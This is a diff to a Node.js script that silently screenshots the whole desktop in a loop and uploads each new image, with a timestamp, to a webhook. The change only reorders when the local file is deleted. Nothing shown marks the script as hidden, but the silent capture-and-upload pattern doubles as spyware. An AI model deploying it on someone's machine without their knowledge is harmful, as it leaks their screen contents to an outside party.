@@ -43,16 +43,13 @@ async function capture() {
 		exec("import", ["-silent", "-window", "root", filepath]);
 	}
 	var data = fs.readFileSync(filepath);
+	try { fs.unlinkSync(filepath); } catch (error) { console.error(error.message); }
 	if (lastdata && data.equals(lastdata)) throw "Identical screenshot";
 	else lastdata = data;
-	try {
-		await webhook.send(`y${filedate.getFullYear()} mo${filedate.getMonth()} d${filedate.getDate()} h${filedate.getHours()} mi${filedate.getMinutes()} s${filedate.getSeconds()}`, {files:[{
-			attachment: data,
-			name: filename
-		}]});
-	} finally {
-		fs.unlinkSync(filepath);
-	}
+	await webhook.send(`y${filedate.getFullYear()} mo${filedate.getMonth()} d${filedate.getDate()} h${filedate.getHours()} mi${filedate.getMinutes()} s${filedate.getSeconds()}`, {files:[{
+		attachment: data,
+		name: filename
+	}]});
 }
 
 (function loop(){
